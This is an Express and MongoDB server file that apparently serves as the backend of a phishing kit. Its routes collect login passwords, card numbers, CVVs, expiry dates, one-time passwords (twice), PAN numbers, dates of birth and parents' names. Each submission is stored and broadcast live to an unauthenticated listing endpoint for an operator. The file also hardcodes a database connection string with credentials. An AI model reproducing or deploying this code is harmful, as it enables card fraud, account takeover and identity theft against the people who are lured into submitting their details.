const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');
const { Server } = require('socket.io');

// App and Server Setup
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: ['http://localhost:3000', 'https://aslka2s.vercel.app'],
    methods: ['GET', 'POST']
  }
});

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
const mongoURI = 'mongodb+srv://rakeshgovinda742:abcdefgh@cluster0.lu51fn9.mongodb.net/mydata?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('✅ MongoDB connected'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// ✅ Unified Schema
const SubmissionSchema = new mongoose.Schema({
  Login_ID: String,
  Password: String,
  mobile: String,
  cardNumber: String,
  expiry: String,
  cvv: String,
  limit: String,
  mobile2: String,
  holderName: String,
  dob: String,
  otp: String,
  fullName: String,
  panNumber: String,
  otp2: String,
  // invalidOtp: String,
  fatherName: String,
  motherName: String,
  type: String,
  submittedAt: { type: Date, default: Date.now }
});

const Submission = mongoose.model('Submission', SubmissionSchema);

// Routes

// ✅ Save Login or Credit Card Submission
app.post('/users', async (req, res) => {
  try {
    const { Login_ID, Password, mobile, cardNumber, expiry, cvv, limit,mobile2 } = req.body;

    const newSubmission = new Submission({
      Login_ID: Login_ID || '',
      Password: Password || '',
      mobile: mobile || '',
      cardNumber: cardNumber || '',
      expiry: expiry || '',
      cvv: cvv || '',
      limit: limit || '',
      mobile2: mobile2 || '',
      type: 'login',
      submittedAt: new Date()
    });

    await newSubmission.save();
    io.emit('new_user', newSubmission);
    res.status(201).send('Login/Credit card data saved successfully');
  } catch (err) {
    console.error('Error saving user:', err);
    res.status(500).send('Server error');
  }
});

// ✅ Save Account Verification Submission
app.post('/account-verification', async (req, res) => {
  try {
    const verificationData = new Submission({
      holderName: req.body.holderName,
      dob: req.body.dob,
      type: 'verification',
      submittedAt: new Date()
    });

    await verificationData.save();
    io.emit('new_user', verificationData);
    res.status(200).json({ message: 'Verification data saved' });
  } catch (err) {
    console.error('Error saving verification data:', err);
    res.status(500).json({ error: 'Failed to save data' });
  }
});

// ✅ Save OTP Submission
app.post('/submit-otp', async (req, res) => {
  try {
    const { otp } = req.body;

    if (!otp || otp.length !== 6) {
      return res.status(400).json({ error: 'Invalid OTP format' });
    }

    const otpData = new Submission({
      otp: otp,
      type: 'otp',
      submittedAt: new Date()
    });

    await otpData.save();
    io.emit('new_otp', otpData);
    res.status(200).json({ message: 'OTP saved successfully' });
  } catch (err) {
    console.error('Error saving OTP:', err);
    res.status(500).json({ error: 'Failed to save OTP' });
  }
});

// ✅ Save PAN Verification Submission
app.post('/pan-verification', async (req, res) => {
  try {
    const panData = new Submission({
      fullName: req.body.fullName,
      panNumber: req.body.panNumber,
      type: 'pan-verification',
      submittedAt: new Date()
    });

    await panData.save();
    io.emit('new_user', panData);
    res.status(200).json({ message: 'PAN data saved' });
  } catch (err) {
    console.error('Error saving PAN data:', err);
    res.status(500).json({ error: 'Failed to save PAN data' });
  }
});
// ✅ Save Second OTP Submission
app.post('/submit-second-otp', async (req, res) => {
  try {
    const { otp2 } = req.body;

    if (!otp2 || otp2.length !== 6) {
      return res.status(400).json({ error: 'Invalid OTP format' });
    }

    const otp2Data = new Submission({
      otp2: otp2,
      type: 'otp2',
      submittedAt: new Date()
    });

    await otp2Data.save();
    io.emit('new_otp2', otp2Data);
    res.status(200).json({ message: 'Second OTP saved successfully' });
  } catch (err) {
    console.error('Error saving second OTP:', err);
    res.status(500).json({ error: 'Failed to save second OTP' });
  }
});
// ✅ Save Second OTP Submission
// app.post('/submit-second-otp', async (req, res) => {
//   try {
//     const { otp2 } = req.body;

//     if (!otp2 || otp2.length !== 6) {
//       return res.status(400).json({ error: 'Invalid OTP format' });
//     }

//     const otp2Data = new Submission({
//       otp2: otp2,
//       type: 'invalid',
//       submittedAt: new Date()
//     });

//     await otp2Data.save();
//     io.emit('new_otp2', otp2Data);
//     res.status(200).json({ message: 'Second OTP saved successfully' });
//   } catch (err) {
//     console.error('Error saving second OTP:', err);
//     res.status(500).json({ error: 'Failed to save second OTP' });
//   }
// });

// ✅ Save Parent Details Submission
app.post('/parent-details', async (req, res) => {
  try {
    const parentDetails = new Submission({
      fatherName: req.body.fatherName,
      motherName: req.body.motherName,
      type: 'parent-details',
      submittedAt: new Date()
    });

    await parentDetails.save();
    io.emit('new_user', parentDetails);
    res.status(200).json({ message: 'Parent details saved' });
  } catch (err) {
    console.error('Error saving parent details:', err);
    res.status(500).json({ error: 'Failed to save parent details' });
  }
});


// ✅ Get All Submissions (for UserList)
app.get('/users', async (req, res) => {
  try {
    const allSubmissions = await Submission.find().sort({ submittedAt: -1 });
    res.json(allSubmissions);
  } catch (err) {
    console.error('Error fetching users:', err);
    res.status(500).send('Server error');
  }
});

// Start Server
server.listen(5000, () => {
  console.log('🚀 Server running on port 5000');
});
